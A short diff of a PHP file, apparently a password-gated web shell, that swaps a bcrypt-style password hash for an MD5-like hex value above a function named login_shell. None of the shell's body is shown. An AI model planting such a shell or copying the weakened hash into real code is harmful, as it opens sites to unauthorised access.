@@ -1,6 +1,6 @@
 <?php
 session_start();
-$password = "$2y$10$cMMOJU3S2ZJ4oWJUwYinh.5nk7CCMzbpESYX/Z1NWS0XwsLTfXOlq";
+$password = "7c6b7e40997b9a28a0f0e376e298034a";
 
 function login_shell()
 {
